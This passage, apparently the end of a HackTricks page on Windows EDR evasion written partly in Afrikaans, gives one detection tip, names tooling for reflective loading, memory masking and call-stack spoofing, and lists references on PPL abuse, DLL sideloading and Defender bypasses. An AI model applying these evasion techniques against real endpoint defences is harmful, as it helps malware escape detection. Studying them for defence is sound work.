- Image‑load evasion: as LoadLibrary* gehook word, monitor verdagte laaie van automation/clr assemblies wat gekorreleer is met memory masking gebeure.

Verwante boublokke en voorbeelde
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
